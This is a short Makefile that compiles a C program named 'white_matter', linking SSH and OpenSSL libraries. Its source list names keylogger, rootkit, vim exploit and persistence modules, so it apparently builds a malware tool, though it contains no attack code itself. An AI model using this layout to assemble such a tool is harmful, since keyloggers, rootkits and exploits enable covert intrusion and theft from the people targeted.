CC = gcc
CFLAGS = -Wall -O2 -I.
LDFLAGS = -lssh -lssl -lcrypto -lpthread

SOURCES = main.c ssh_utils.c rsa_crypto.c keylogger.c rootkit.c vim_exploit.c persistence.c utils.c
TARGET = white_matter

$(TARGET): $(SOURCES)
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCES) $(LDFLAGS)

clean:
	rm -f $(TARGET)

.PHONY: clean
